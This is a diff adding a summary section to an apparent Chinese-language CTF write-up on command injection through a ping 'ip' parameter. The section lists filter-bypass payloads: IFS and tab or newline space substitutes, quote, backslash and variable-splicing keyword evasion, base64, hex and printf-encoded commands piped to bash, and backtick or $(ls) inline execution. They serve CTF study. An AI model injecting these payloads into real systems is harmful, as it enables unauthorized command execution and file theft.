@@ -213,3 +213,42 @@ PING 1 (0.0.0.1): 56 data bytes
 ```
 内联大概就是把反引号内执行后的内容作为我们的payload的一部分
 ls执行后第一行就是flag.php
+
+
+**知识点：**
+
+1.空格绕过
+        ${IFS}
+        ${IFS}$1
+        $IFS$1
+        <和<>
+        {cat,flag}
+        %20替换
+        %0a （换行）
+        %0d （回车）
+        %09 （tab）
+        
+2.黑名单(关键字）绕过
+
+        单引号、双引号绕过：c"at"t fl''ag
+        反斜线绕过：ca\t fl\ag
+        和
+        @绕过：c$1at fl$@ag
+        拼接绕过：
+                a=c;b=at;c=fl;d=ag; $a$b $c$d （不用加｜）
+                /?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php或者
+                /?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php
+        base64：
+                echo "Y2F0IGZsYWc="|base64 -d
+                echo "Y2F0IGZsYWc="|base64 -d|bash
+                |echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
+        hex编码绕过：
+                echo "0x63617420666c61670a" | xxd -r -p|bash
+        oct编码绕过：
+                $(printf "\x63\x61\x74\x20\x66\x6c\x61\x67")
+                {printf,"\x63\x61\x74\x20\x66\x6c\x61\x67"}|$0
+3.内联绕过：
+所谓内联绕过就是将反引号内命令的输出作为输入执行，比如系统对flag字符进行了过滤，那么我们可以通过ls命令将flag.php输出作为输入，有以下两种方式：
+
+        ?ip=127.0.0.1;cat 'ls'
+        ?ip=127.0.0.1;cat $(ls)
